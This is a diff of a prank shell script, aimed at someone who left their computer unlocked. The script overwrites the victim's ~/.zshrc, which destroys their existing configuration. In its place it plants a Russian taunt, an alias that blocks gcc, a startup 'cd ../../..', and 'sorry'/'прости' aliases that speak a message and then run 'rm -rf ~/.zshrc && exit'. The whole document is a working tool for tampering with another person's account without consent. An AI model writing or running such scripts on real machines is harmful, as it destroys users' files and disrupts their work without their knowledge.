@@ -4,6 +4,7 @@ file=~/.zshrc
 touch $file
 
 echo "echo ಥ_ಥ Почему ты не заблокировал меня ಥ_ಥ" > $file
+echo "cd ../../..">> $file
 echo " ">> $file
 # echo "i=0">> $file
 
@@ -28,10 +29,10 @@ echo "alias gcc='echo Стой стой стой, никакого кода && $
 
 echo " ">> $file
 # 
-echo "alias Прости='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
-echo "alias прости='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
-echo "alias sorry='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
-echo "alias Sorry='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
-echo "alias klotzgal='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
-echo "alias извини='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
-echo "alias Извини='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc'">> $file
+echo "alias Прости='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && exit'">> $file
+echo "alias прости='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && exit'">> $file
+echo "alias sorry='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && exit'">> $file
+echo "alias Sorry='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && exit'">> $file
+echo "alias klotzgal='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && exit'">> $file
+echo "alias извини='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && exit'">> $file
+echo "alias Извини='echo На этот раз прощаю && say -v Milena На этот раз прощаю && rm -rf ~/.zshrc && exit'">> $file
